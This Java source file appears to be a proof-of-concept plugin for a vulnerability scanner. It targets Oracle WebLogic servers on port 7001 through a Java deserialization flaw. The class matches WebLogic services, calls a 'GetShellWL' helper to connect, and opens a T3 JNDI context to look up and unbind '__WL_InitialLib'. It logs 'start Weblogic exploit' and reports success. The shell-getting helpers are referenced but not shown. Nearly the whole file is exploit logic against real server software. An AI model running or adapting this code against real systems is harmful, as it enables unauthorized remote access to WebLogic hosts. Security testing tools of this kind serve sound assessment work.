

import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Map;

import javax.naming.InitialContext;
import javax.naming.NamingException;

import cn.com.sgcc.marki_with_maven.modules.IPocBase;
import weblogic.jndi.internal.InitApp;

public class JAVAUnseriaLize implements IPocBase {

	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "JAVAUnseriaLize");
		return info;
	}

	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceVersion.toLowerCase().contains("weblogic") || Integer.valueOf(port) == 7001)
		{
			ismatch = true;
		}
		return ismatch;
	}
	
	public boolean testConnection(String host, String port) {
		InitialContext Ic = null;
		boolean succuss = false;
		try {
			GetShellWL.Connect(host, port);
		} catch (Exception localException1) {
		}
		try {
			Ic = RyClient.getInitialContext("t3://" + host + ":" + port);
			InitApp App = (InitApp) Ic.lookup("__WL_InitialLib");
			succuss = true;
		} catch (Exception ex) {
			System.err.println("An exception occurred: " + ex.getMessage());
		}
		if (succuss) {
			try {
				Ic.unbind("__WL_InitialLib");
				GetShellWL.DisConnect(host, port);
			} catch (NamingException e) {
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return succuss;
	}

	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip =  (String) IPocBase.Utils.getParameter(infodict, "ip");
		String port =  (String) IPocBase.Utils.getParameter(infodict, "port");
		String serviceType =  (String) IPocBase.Utils.getParameter(infodict, "service_type");
		String serviceVersion =  (String) IPocBase.Utils.getParameter(infodict, "service_version");
		Boolean success = false;
		try
		{
			if(infodict.get("outputStream") != null)
				((ByteArrayOutputStream)infodict.get("outputStream")).write(String.format("start Weblogic exploit\n").getBytes());
			success = testConnection(ip, port);
		}
		catch(Exception e)
		{
//			success = false;
		}
//		if(infodict.get("outputStream") != null)
//			((ByteArrayOutputStream)infodict.get("outputStream")).write( 
//					(String.format("Testing Mysql %s,%s", userName, passWord)).getBytes());
		return success;
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub

	}

}
